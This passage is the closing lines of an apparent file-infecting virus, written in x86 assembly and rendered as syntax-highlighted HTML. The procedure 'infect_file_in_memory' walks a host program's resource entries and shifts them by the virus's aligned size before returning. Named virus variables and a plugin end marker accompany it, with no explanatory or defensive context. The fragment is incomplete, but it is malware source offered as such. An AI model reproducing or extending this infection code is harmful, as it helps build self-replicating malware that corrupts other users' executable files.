                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__x_both</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__rsrc_cycle</span><span class="sc0">

</span><span class="sc5">__rsrc_end</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file_in_memory</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

                        </span><span class="sc5">PLUGIN_END</span><span class="sc0">
</span></div></body>
</html>
